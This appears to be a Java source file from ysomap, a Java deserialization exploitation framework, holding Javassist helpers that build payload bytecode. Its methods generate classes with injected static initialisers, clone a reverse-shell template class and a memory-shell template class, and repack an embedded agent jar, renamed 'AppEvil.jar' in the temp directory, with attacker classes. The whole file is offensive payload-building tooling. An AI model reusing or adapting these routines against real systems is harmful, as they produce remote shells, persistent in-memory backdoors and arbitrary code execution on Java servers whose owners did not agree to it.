package ysomap.core.util;

import echo.AppRunStart;
import echo.SocketEchoPayload;
import javassist.*;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.Map;
import java.util.TreeMap;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
public class ClassFiles {


    public static byte[] makeClassWithStaticBlock(String classname, String body) throws Exception {
        ClassPool pool = new ClassPool(true);
        CtClass cc = makeEmptyClassFile(pool, classname, null);
        insertStaticBlock(cc, body);
        return cc.toBytecode();
    }

    public static byte[] makeClassWithReverseShell(String classname, String body) throws Exception {
        ClassPool pool = new ClassPool(true);
        pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
        CtClass cc = pool.getCtClass(SocketEchoPayload.class.getName());
        cc.setName(classname);
        insertStaticBlock(cc, body);
        return cc.toBytecode();
    }

    public static byte[] makeClassWithMemShell(String classname) throws Exception {
        ClassPool pool = new ClassPool(true);
        pool.appendClassPath(new ClassClassPath(AppRunStart.class));
        CtClass cc = pool.getCtClass(AppRunStart.class.getName());
        cc.setName(classname.replaceAll("/","."));
        return cc.toBytecode();
    }

    public static void unpackJar() {
        URL url = Thread.currentThread().getContextClassLoader().getResource("agent.jar");
        String jarPath = url.getFile().replaceAll("!/agent.jar", "").replace("file:/", "");
        String tempPath = System.getProperty("java.io.tmpdir") + "AppEvil.jar";
        Path myFilePath = Paths.get(tempPath);

        if(myFilePath.toFile().exists()) {
            return;
        }

        Path zipFilePath = Paths.get(jarPath);
        try( FileSystem fs = FileSystems.newFileSystem(zipFilePath, null) ){
            Path fileInsideZipPath = fs.getPath("agent.jar");
            Files.copy(fileInsideZipPath, myFilePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static byte[] makeJarWithCopyClazz(byte[] data,String className) {
        className += ".class";
        unpackJar();

        String jarname = System.getProperty("java.io.tmpdir") + "AppEvil.jar";;
        String tempJarName = System.getProperty("java.io.tmpdir") + "temp_agent.jar";
        try{
            //1、首先将原Jar包里的所有内容读取到内存里，用TreeMap保存
            JarFile jarFile = new JarFile(jarname);
            //可以保持排列的顺序,所以用TreeMap 而不用HashMap
            TreeMap tm = new TreeMap();
            Enumeration es = jarFile.entries();
            while(es.hasMoreElements()){
                JarEntry je = (JarEntry)es.nextElement();
                byte[] b = readStream(jarFile.getInputStream(je));
                tm.put(je.getName(),b);
            }

            JarOutputStream jos = new JarOutputStream(new FileOutputStream(tempJarName));
            Iterator it = tm.entrySet().iterator();
            boolean has = false;

            //2、将TreeMap重新写到原jar里，如果TreeMap里已经有entryName文件那么覆盖，否则在最后添加
            while(it.hasNext()){
                Map.Entry item = (Map.Entry) it.next();
                String name = (String)item.getKey();
                JarEntry entry = new JarEntry(name);
                jos.putNextEntry(entry);
                byte[] temp ;
                if(name.equals(className)){
                    //覆盖
                    temp = data;
                    has = true ;
                }else{
                    temp = (byte[])item.getValue();
                }
                jos.write(temp, 0, temp.length);
            }

            if(!has){
                //最后添加
                JarEntry newEntry = new JarEntry(className);
                jos.putNextEntry(newEntry);
                jos.write(data, 0, data.length);
            }
            jos.finish();
            jos.close();
        }catch (Exception e){
            e.printStackTrace();
        }

        File tjarFile = new File(tempJarName);
        byte[] bytes = new byte[(int)tjarFile.length()];
        try(FileInputStream fis = new FileInputStream(tjarFile)){
            fis.read(bytes);
        }catch (IOException e){
            e.printStackTrace();
        }
        tjarFile.delete();
        return bytes;
    }

    /**
     * 读取流
     *
     * @param inStream
     * @return 字节数组
     * @throws Exception
     */
    public static byte[] readStream(InputStream inStream) throws Exception {
        ByteArrayOutputStream outSteam = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len = -1;
        while ((len = inStream.read(buffer)) != -1) {
            outSteam.write(buffer, 0, len);
        }
        outSteam.close();
        inStream.close();
        return outSteam.toByteArray();
    }

    public static byte[] makeJarWithMultiClazz(String jarname, Map<String, byte[]> bytecodes){
        try(ZipOutputStream zipout = new ZipOutputStream(new FileOutputStream(jarname))){
            for(Map.Entry<String, byte[]> clazz:bytecodes.entrySet()){
                String classname = clazz.getKey();
                byte[] bytecode = clazz.getValue();
                if(classname.endsWith(".class")){
                    classname = classname.replaceFirst("\\.class$", "");
                }
                classname = classname.replace(".","/");
                classname += ".class";
                ZipEntry entry = new ZipEntry(classname);// 填充文件内容
                zipout.putNextEntry(entry);
                zipout.write(bytecode);
            }
        }catch (IOException e) {
            e.printStackTrace();
        }
        File jarFile = new File(jarname);
        byte[] bytes = new byte[(int)jarFile.length()];
        try(FileInputStream fis = new FileInputStream(jarFile)){
            fis.read(bytes);
        }catch (IOException e){
            e.printStackTrace();
        }
        jarFile.delete();
        return bytes;
    }

    public static byte[] makeClassWithDefaultConstructor(String classname, String body) throws Exception {
        ClassPool pool = new ClassPool(true);// 防止同一个classname 多次创建而报错 不用defaultPool
        CtClass cc = makeEmptyClassFile(pool, classname, body);
        return cc.toBytecode();
    }

    public static CtClass makeEmptyClassFile(ClassPool pool, String classname, String body) throws Exception{
        CtClass cc = pool.makeClass(classname);

        if(body != null){
            CtConstructor constructor = CtNewConstructor.defaultConstructor(cc);
            cc.addConstructor(constructor);
//            constructor.
            constructor.insertAfter(body);
        }
        return cc;
    }

    public static CtClass makeClassFromExistClass(ClassPool pool, Class<?> existClassTpl, Class<?>[] classpath) throws NotFoundException {
        insertClassPath(pool, classpath);
        pool.insertClassPath(new ClassClassPath(existClassTpl));
        return pool.get(existClassTpl.getName());
    }

    public static void insertClassPath(ClassPool pool, Class<?>[] classpath){
        for(Class<?> clazz:classpath){
            if(clazz == null){
                continue;
            }
            pool.insertClassPath(new ClassClassPath(clazz));
        }
    }

    public static void insertSuperClass(ClassPool pool, CtClass cc, Class<?> superClass) throws NotFoundException, CannotCompileException {
        CtClass superClazz = pool.get(superClass.getName());
        cc.setSuperclass(superClazz);
    }

    public static void insertStaticBlock(CtClass cc, String code) throws CannotCompileException {
        cc.makeClassInitializer().insertAfter(code);
    }

    public static void insertInterface(ClassPool pool, CtClass cc, Class<?> iface) throws NotFoundException {
        CtClass ifaceClazz = pool.get(iface.getName());
        if(ifaceClazz == null){
            pool.insertClassPath(new ClassClassPath(iface));
            ifaceClazz = pool.get(iface.getName());
        }
        cc.addInterface(ifaceClazz);
    }

    public static void insertMethod(CtClass cc, String methodName,
                                       String body, CtClass[] params,
                                       CtClass returnType, CtClass[] exceptions)
            throws CannotCompileException {
        CtMethod method = CtNewMethod.make(Modifier.PUBLIC,
                                    returnType, methodName,
                                    params, exceptions, body, cc);
        cc.addMethod(method);
    }

    public static void insertMethod(CtClass cc, String src) throws CannotCompileException {
        CtMethod method = CtNewMethod.make(src, cc);
        cc.addMethod(method);
    }
}
